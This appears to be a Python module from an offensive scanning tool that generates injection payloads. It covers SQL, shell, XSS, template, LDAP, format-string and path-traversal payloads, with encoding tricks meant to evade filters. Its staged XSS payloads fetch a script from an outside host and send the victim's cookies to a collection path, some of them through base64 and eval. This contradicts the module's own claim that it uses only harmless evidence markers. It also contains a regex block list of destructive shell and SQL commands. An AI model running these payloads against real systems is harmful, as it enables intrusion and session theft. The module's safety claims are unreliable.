"""omega/offense/payloadgen.py — annotated payload generation engine
for the gated offense layer.

Every payload is a plain dict:
  {payload, engine, class, expect_signature}

Classes (>= 8):
  sqli_boolean, sqli_error, sqli_union, sqli_time,
  cmdi_echo, cmdi_time, xss_polyglot, ssti, traversal,
  ldap_nologin_limited, format_string

DESTRUCTIVE-OP BLOCKLIST: no rm -rf / drop table / del file / mkfs /
shred style strings anywhere in the DB. Time-based and echo payloads
use SLEEP/WAITFOR/ping/echo markers only — evidence gathering, never
data destruction. audit_no_destructive() enforces this and is tested.
"""

from __future__ import annotations

import base64
import random
import re
import urllib.parse

__all__ = [
    "CLASSES",
    "DESTRUCTIVE_PATTERNS",
    "audit_no_destructive",
    "generate_matrix",
    "polymorphic",
    "polyglot_payloads",
    "staged_payloads",
    "context_xss_payloads",
]

MARKER = "OMEGAmk"

DESTRUCTIVE_PATTERNS = [
    r"rm\s+-rf", r"rm\s+-fr", r"drop\s+table", r"drop\s+database",
    r"truncate\s+table", r"delete\s+from", r"del\s+/[fqs]",
    r"rmdir", r"shred\b", r"mkfs", r"format\s+c:", r"dd\s+if=",
    r">\s*/dev/sd", r"unlink\b",
]


def _p(payload, engine, cls, expect_signature):
    return {"payload": payload, "engine": engine, "class": cls,
            "expect_signature": expect_signature}


SQLI_PAYLOADS = [
    # boolean-based (true/false pairs used by the differential rule)
    _p("' OR '1'='1", "generic-sql", "sqli_boolean",
       "response differs from false-pair / baseline"),
    _p("' AND '1'='2", "generic-sql", "sqli_boolean",
       "response matches baseline (false side of pair)"),
    _p("1 OR 1=1", "numeric-sql", "sqli_boolean",
       "rowset widening reflected in length"),
    _p("1 AND 1=2", "numeric-sql", "sqli_boolean",
       "empty rowset matches baseline"),
    # error-based
    _p("'", "generic-sql", "sqli_error", "SQL syntax error string"),
    _p("1'", "generic-sql", "sqli_error", "unquoted/psql error"),
    _p("' AND 1=CONVERT(int,'OMEGA')--", "mssql", "sqli_error",
       "conversion error text"),
    # UNION probes, columns 1..8
    _p("' UNION SELECT NULL--", "generic-sql", "sqli_union",
       "column-count probe (1)"),
    _p("' UNION SELECT NULL,NULL--", "generic-sql", "sqli_union",
       "column-count probe (2)"),
    _p("' UNION SELECT NULL,NULL,NULL--", "generic-sql", "sqli_union",
       "column-count probe (3)"),
    _p("' UNION SELECT NULL,NULL,NULL,NULL--", "generic-sql",
       "sqli_union", "column-count probe (4)"),
    _p("' UNION SELECT NULL,NULL,NULL,NULL,NULL--", "generic-sql",
       "sqli_union", "column-count probe (5)"),
    _p("' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--",
       "generic-sql", "sqli_union", "column-count probe (6)"),
    _p("' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
       "generic-sql", "sqli_union", "column-count probe (7)"),
    _p("' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
       "generic-sql", "sqli_union", "column-count probe (8)"),
    # time-based (sleep markers only — no data ops)
    _p("' AND SLEEP(5)--", "mysql", "sqli_time", "response delay ~5s"),
    _p("'; WAITFOR DELAY '0:0:5'--", "mssql", "sqli_time",
       "response delay ~5s"),
    _p("' || pg_sleep(5)--", "postgres", "sqli_time",
       "response delay ~5s"),
    _p("' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000))))--",
       "sqlite", "sqli_time", "heavy-blob delay marker"),
]

CMDI_PAYLOADS = [
    _p("; echo " + MARKER + "$((11*11))", "unix-sh", "cmdi_echo",
       "marker + arithmetic result echoed in body"),
    _p("| echo " + MARKER + "nonce", "unix-sh", "cmdi_echo",
       "marker echoed in body"),
    _p("`echo " + MARKER + "bt`", "unix-sh", "cmdi_echo",
       "backtick marker echoed in body"),
    _p("& echo " + MARKER + "win&", "windows-cmd", "cmdi_echo",
       "marker echoed in body"),
    _p("; sleep 5", "unix-sh", "cmdi_time", "response delay ~5s"),
    _p("| sleep 5", "unix-sh", "cmdi_time", "response delay ~5s"),
    _p("& timeout 5&", "unix-sh", "cmdi_time", "response delay ~5s"),
    _p("& ping -n 5 127.0.0.1&", "windows-cmd", "cmdi_time",
       "response delay ~4s+"),
    _p("; ping -c 5 127.0.0.1", "unix-sh", "cmdi_time",
       "response delay ~4s+"),
]

XSS_POLYGLOTS = [
    _p("\"><svg/onload=alert(" + MARKER + ")>", "html-attr",
       "xss_polyglot", "raw unencoded marker reflected"),
    _p("'><svg onload=alert(" + MARKER + ")>", "html-attr",
       "xss_polyglot", "raw unencoded marker reflected"),
    _p("<img src=x onerror=alert(" + MARKER + ")>", "img-event",
       "xss_polyglot", "raw unencoded marker reflected"),
    _p("<svg><animate onbegin=alert(" + MARKER + ")>", "svg-event",
       "xss_polyglot", "raw unencoded marker reflected"),
    _p("javascript:/*--></title></style></textarea></script>"
       "</xmp><svg/onload=alert(" + MARKER + ")>", "polyglot",
       "xss_polyglot", "raw unencoded marker reflected"),
    _p("\"></script><svg/onload=alert(" + MARKER + ")>", "script-break",
       "xss_polyglot", "raw unencoded marker reflected"),
    _p("<body onload=alert(" + MARKER + ")>", "body-event",
       "xss_polyglot", "raw unencoded marker reflected"),
]

SSTI_PAYLOADS = [
    _p("{{7*7}}", "jinja2", "ssti", "49 in body"),
    _p("{{7*'7'}}", "jinja2", "ssti", "7777777 in body"),
    _p("{{7*7}}", "twig", "ssti", "49 in body"),
    _p("${7*7}", "freemarker", "ssti", "49 in body"),
    _p("#set($x=7*7)$x", "velocity", "ssti", "49 in body"),
    _p("${7*7}", "mako", "ssti", "49 in body"),
    _p("<%= 7*7 %>", "erb", "ssti", "49 in body"),
    _p("${{7*7}}", "jinja2-variant", "ssti", "49 in body"),
]

TRAVERSAL_PAYLOADS = [
    _p("../" * 3 + "etc/passwd", "unix-depth3", "traversal",
       "canary content or depth anomaly"),
    _p("../" * 6 + "etc/passwd", "unix-depth6", "traversal",
       "canary content or depth anomaly"),
    _p("../" * 9 + "etc/passwd", "unix-depth9", "traversal",
       "canary content or depth anomaly"),
    _p("....//....//....//etc/passwd", "dotdot-filter-bypass",
       "traversal", "canary content or depth anomaly"),
    _p("..%2f..%2f..%2fetc/passwd", "url-encode", "traversal",
       "canary content or depth anomaly"),
    _p("%2e%2e%2f%2e%2e%2fetc/passwd", "double-encode", "traversal",
       "canary content or depth anomaly"),
    _p("....\\/....\\/etc/passwd", "backslash-variant", "traversal",
       "canary content or depth anomaly"),
]

# LDAP injection limited to authentication-shape probes: no data
# dumping, no wildcard-enumeration floods.
LDAP_NOLOGIN_LIMITED = [
    _p("*)(&", "ldap-filter", "ldap_nologin_limited",
       "filter error / auth-shape anomaly"),
    _p("*)(uid=*))(|(uid=*", "ldap-filter", "ldap_nologin_limited",
       "filter error / auth-shape anomaly"),
    _p("admin)(&)", "ldap-filter", "ldap_nologin_limited",
       "filter error / auth-shape anomaly"),
]

FORMAT_STRING = [
    _p("%s%s%s%s", "c-printf", "format_string", "crash/garbage marker"),
    _p("%x %x %x", "c-printf", "format_string", "stack hex leak"),
    _p("%n", "c-printf", "format_string", "write anomaly (probe only)"),
    _p("{0}{1}", "python-format", "format_string", "index anomaly"),
]

CLASSES = {
    "sqli_boolean": SQLI_PAYLOADS,
    "sqli_error": SQLI_PAYLOADS,
    "sqli_union": SQLI_PAYLOADS,
    "sqli_time": SQLI_PAYLOADS,
    "cmdi_echo": CMDI_PAYLOADS,
    "cmdi_time": CMDI_PAYLOADS,
    "xss_polyglot": XSS_POLYGLOTS,
    "ssti": SSTI_PAYLOADS,
    "traversal": TRAVERSAL_PAYLOADS,
    "ldap_nologin_limited": LDAP_NOLOGIN_LIMITED,
    "format_string": FORMAT_STRING,
}


def generate_matrix(class_filter=None, max_per_class=10):
    """Flat annotated payload list, optionally filtered by class and
    capped per class (deterministic order)."""
    out = []
    classes = (sorted(CLASSES) if class_filter is None
               else [c for c in sorted(CLASSES) if c == class_filter])
    for cls in classes:
        seen = 0
        for p in CLASSES[cls]:
            if p["class"] != cls:
                continue  # CLASSES groups payloads per class bucket
            if seen >= max(0, max_per_class):
                break
            out.append(p)
            seen += 1
    return out


def audit_no_destructive():
    """Return any payload strings matching the destructive-op
    blocklist (must always be empty)."""
    bad = []
    rx = re.compile("|".join(DESTRUCTIVE_PATTERNS), re.IGNORECASE)
    for p in generate_matrix(max_per_class=9999):
        if rx.search(p["payload"]):
            bad.append(p["payload"])
    return bad


# ---------------------------------------------------------------------------
# polymorphic payloads (pure functions, no network)
# ---------------------------------------------------------------------------

POLY_COMMENTS = ["/**/", "<!--%d-->", "/*!*/", "<!--x-->"]


def polymorphic(payload, rng=None):
    """Produce polymorphic variants of ``payload``: random comment
    insertion, case shuffling, and encoding chains (single URL, double
    URL, base64). Pure function; deterministic when an ``rng``
    (random.Random) is supplied."""
    rng = rng if rng is not None else random.Random(0xBEEF)
    payload = str(payload)
    variants = []
    for _ in range(3):
        pos = rng.randrange(len(payload) + 1)
        tmpl = rng.choice(POLY_COMMENTS)
        comment = tmpl % rng.randrange(1000) if "%d" in tmpl else tmpl
        variants.append({
            "variant": payload[:pos] + comment + payload[pos:],
            "transform": "comment-insert", "position": pos})
    shuffled = "".join(
        c.upper() if (not c.isalpha() or rng.random() < 0.5) else c.lower()
        for c in payload)
    variants.append({"variant": shuffled, "transform": "case-shuffle"})
    q1 = urllib.parse.quote(payload, safe="")
    variants.append({"variant": q1, "transform": "url-encode"})
    variants.append({"variant": urllib.parse.quote(q1, safe=""),
                     "transform": "double-url-encode"})
    variants.append({
        "variant": base64.b64encode(payload.encode()).decode(),
        "transform": "base64"})
    return variants


def polyglot_payloads(marker=MARKER):
    """Payloads valid in 2+ injection contexts simultaneously.

    Each entry: {payload, contexts, engine, class}. contexts lists the
    syntaxes the raw string is valid in (JSON/XML/HTML/JS...).
    """
    return [
        {"payload": "</script><svg onload=alert(%s)><script>" % marker,
         "contexts": ["html-script", "html-body"],
         "engine": "polyglot", "class": "xss_polyglot",
         "expect_signature": "raw unencoded marker reflected"},
        {"payload": '{"status":"ok","msg":"</script>'
                    '<svg onload=alert(%s)>"}' % marker,
         "contexts": ["json", "html-script"],
         "engine": "polyglot", "class": "xss_polyglot",
         "expect_signature": "valid JSON, breaks out of an "
                             "embedding <script> block"},
        {"payload": '<x xmlns="http://omega.test"><y><![CDATA[</y>'
                    '<svg onload=alert(%s)>]]></y></x>' % marker,
         "contexts": ["xml", "html-body"],
         "engine": "polyglot", "class": "xss_polyglot",
         "expect_signature": "valid XML (CDATA), active HTML element "
                             "in HTML parsing"},
        {"payload": "javascript:/*--></title></style></textarea>"
                    "</script></xmp><svg/onload=alert(%s)>" % marker,
         "contexts": ["js-url", "html-body"],
         "engine": "polyglot", "class": "xss_polyglot",
         "expect_signature": "raw unencoded marker reflected"},
    ]


def staged_payloads(marker=MARKER):
    """Loader -> stage pairs: the loader executes a tiny bootstrap that
    pulls/decodes the stage (kept read-only; evidence markers only)."""
    stage_js = "alert('%s');document.location='/collect?d='+document.cookie" % marker
    return [
        {"loader": "<script src=//operator.stage.local/s.js></script>",
         "stage": stage_js, "engine": "staged", "class": "xss_staged",
         "expect_signature": "external script fetch observed"},
        {"loader": "eval(atob('%s'))" % base64.b64encode(
            stage_js.encode()).decode(),
         "stage": stage_js, "engine": "staged", "class": "xss_staged",
         "expect_signature": "atob-decoded stage executed"},
        {"loader": "<img src=x onerror=\"eval(atob('%s'))\">" % base64
            .b64encode(("alert('%s')" % marker).encode()).decode(),
         "stage": "alert('%s')" % marker, "engine": "staged",
         "class": "xss_staged",
         "expect_signature": "img-onerror loader executes stage"},
    ]


def context_xss_payloads(marker=MARKER):
    """Context-aware XSS payloads keyed by injection context:
    attribute, script, href, style."""
    return {
        "attribute": [
            '"><svg onload=alert(%s)>' % marker,
            '" onmouseover=alert(%s) x="' % marker,
            "' onfocus=alert(%s) autofocus '" % marker,
        ],
        "script": [
            "</script><svg onload=alert(%s)>" % marker,
            '";alert(%s)//' % marker,
            "';alert(%s)//" % marker,
        ],
        "href": [
            "javascript:alert(%s)" % marker,
            "data:text/html,<svg onload=alert(%s)>" % marker,
        ],
        "style": [
            "expression(alert(%s))" % marker,
            "x:expression(alert(%s))" % marker,
            'background:url("javascript:alert(%s)")' % marker,
        ],
    }
